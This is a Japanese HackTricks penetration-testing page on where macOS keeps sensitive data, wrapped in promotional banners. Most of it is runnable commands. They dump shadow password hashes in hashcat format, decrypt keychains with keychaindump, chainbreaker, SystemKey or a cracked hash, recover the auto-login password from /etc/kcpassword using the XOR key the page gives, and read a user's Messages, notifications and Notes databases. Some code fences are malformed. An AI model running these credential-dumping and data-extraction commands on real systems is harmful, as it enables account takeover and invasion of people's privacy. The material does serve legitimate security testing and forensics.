# macOS 機密ロケーション

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。

</details>

## パスワード

### シャドウパスワード

シャドウパスワードは **`/var/db/dslocal/nodes/Default/users/`** にある plist にユーザーの設定と共に保存されています。\
以下のワンライナーを使用して、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプすることができます：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```
[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)や[**このスクリプト**](https://github.com/octomagon/davegrohl.git)を使用して、ハッシュを**hashcat** **形式**に変換することができます。

サービスアカウント以外のすべてのアカウントのクレデンシャルをhashcat形式 `-m 7100` (macOS PBKDF2-SHA512)でダンプする代替ワンライナー:
```
{% endcode %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### キーチェーンダンプ

securityバイナリを使用して**パスワードを復号化してダンプする**場合、ユーザーにこの操作を許可するように求めるプロンプトが複数回表示されることに注意してください。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
このコメントに基づくと [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) Big Surではこれらのツールはもう動作しないようです。
{% endhint %}

攻撃者はシステムへのアクセスを得て、**keychaindump**を実行するために**root**権限に昇格する必要があります。このアプローチにはそれ自体の条件があります。前述の通り、**ログイン時にデフォルトでキーチェーンはアンロックされ**、システムを使用している間アンロックされたままです。これは、アプリケーションがキーチェーンにアクセスしたいときに毎回パスワードを入力する必要がないようにするための利便性です。ユーザーがこの設定を変更し、毎回の使用後にキーチェーンをロックするように選択した場合、keychaindumpはもう機能しません。これはアンロックされたキーチェーンに依存して機能するためです。

Keychaindumpがメモリからパスワードを抽出する方法を理解することが重要です。この取引で最も重要なプロセスは "**securityd**" **プロセス**です。Appleはこのプロセスを**認証と暗号操作のためのセキュリティコンテキストデーモン**として言及しています。Appleの開発者ライブラリはそれについてあまり詳しくは述べていませんが、securitydがキーチェーンへのアクセスを扱うことを教えてくれます。Juusoの研究では、**キーチェーンを解読するために必要なキーを "The Master Key"** と呼んでいます。このキーを取得するためにはいくつかのステップを踏む必要があります。それはユーザーのOS Xログインパスワードから派生しています。キーチェーンファイルを読むためには、このマスターキーが必要です。それを取得するために以下のステップを実行できます。**securitydのヒープをスキャンする（keychaindumpはvmmapコマンドでこれを行います）**。可能なマスターキーはMALLOC\_TINYとしてフラグが立てられたエリアに保存されています。以下のコマンドでこれらのヒープの場所を自分で確認できます：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** は返されたヒープ内で0x0000000000000018の出現を検索します。次の8バイトの値が現在のヒープを指している場合、潜在的なマスターキーを見つけたことになります。ここからはソースコードで見られるように、まだ少しの難読化解除が必要ですが、分析者として最も重要な点は、この情報を復号するために必要なデータがsecuritydのプロセスメモリに格納されているということです。以下にkeychain dumpの出力例を示します。
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、OSXキーチェーンから以下の情報を法医学的に正確な方法で抽出するために使用できます：

* ハッシュ化されたキーチェーンパスワード。[hashcat](https://hashcat.net/hashcat/) や [John the Ripper](https://www.openwall.com/john/) でクラッキングに適しています。
* インターネットパスワード
* 一般パスワード
* 秘密鍵
* 公開鍵
* X509証明書
* セキュアノート
* Appleshareパスワード

キーチェーンのアンロックパスワード、[volafox](https://github.com/n0fate/volafox) や [volatility](https://github.com/volatilityfoundation/volatility) を使用して取得したマスターキー、またはSystemKeyのようなアンロックファイルがある場合、Chainbreakerは平文のパスワードも提供します。

これらのキーチェーンをアンロックする方法がない場合、Chainbreakerは他の利用可能な情報をすべて表示します。

### **キーチェーンキーのダンプ**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **SystemKeyを使用してキーチェーンキー（パスワード付き）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **キーチェーンのキー（パスワード付き）をハッシュを解読してダンプする**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **メモリダンプでキーチェーンのキー（パスワード付き）をダンプする**

[これらのステップに従って](..#dumping-memory-with-osxpmem) **メモリダンプ** を実行してください
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **ユーザーパスワードを使用してキーチェーンのキー（パスワード付き）をダンプする**

ユーザーのパスワードを知っている場合、それを使用して**ユーザーに属するキーチェーンをダンプおよび復号化する**ことができます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** ファイルは、システムの所有者が**自動ログインを有効にしている場合にのみ**、**ユーザーのログインパスワード**を保持するファイルです。したがって、ユーザーはパスワードを求められることなく自動的にログインされます（これはあまり安全ではありません）。

パスワードはファイル **`/etc/kcpassword`** にキー **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** とxorされて格納されています。ユーザーのパスワードがキーより長い場合、キーは再利用されます。\
これにより、[**このスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)のようなスクリプトを使用してパスワードをかなり簡単に回復することができます。

## データベース内の興味深い情報

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

通知データは `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` で見つけることができます。

興味深い情報のほとんどは **blob** にあります。その内容を**抽出**し、**人間が読める形式**に**変換**するか、**`strings`** を使用する必要があります。アクセスするには以下のようにします：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### ノート

ユーザーの**ノート**は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
```markdown
{% endcode %}

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
